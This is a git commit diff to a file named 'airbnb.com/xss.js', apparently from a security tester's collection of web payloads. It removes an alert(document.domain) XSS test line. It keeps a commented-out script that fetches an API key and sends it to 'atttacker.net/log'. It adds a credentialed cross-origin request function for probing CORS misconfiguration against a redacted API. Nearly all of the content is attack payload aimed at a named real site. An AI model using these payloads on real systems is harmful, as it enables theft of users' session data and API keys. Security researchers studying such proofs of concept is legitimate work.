45d363c4d8f015f74330aa41dae22d5cb8005cf0
jvstmer <57935669+jvstmer@users.noreply.github.com>
2022-06-18 17:13:28 -0500

    1

--- airbnb.com/xss.js
+++ airbnb.com/xss.js
@@ -1,4 +1,3 @@
-alert(document.domain);
 /*var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://btc-exchange/api/requestApiKey',true);
@@ -9,3 +8,16 @@ function reqListener() {
     location='//atttacker.net/log?key='+this.responseText;
 };
 */
+
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.status == 200) {
+      alert(this.responseText);
+      document.getElementById("demo").innerHTML = this.responseText;
+    }
+};
+xhttp.open("GET", "https://www.redacted.com/api/return", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
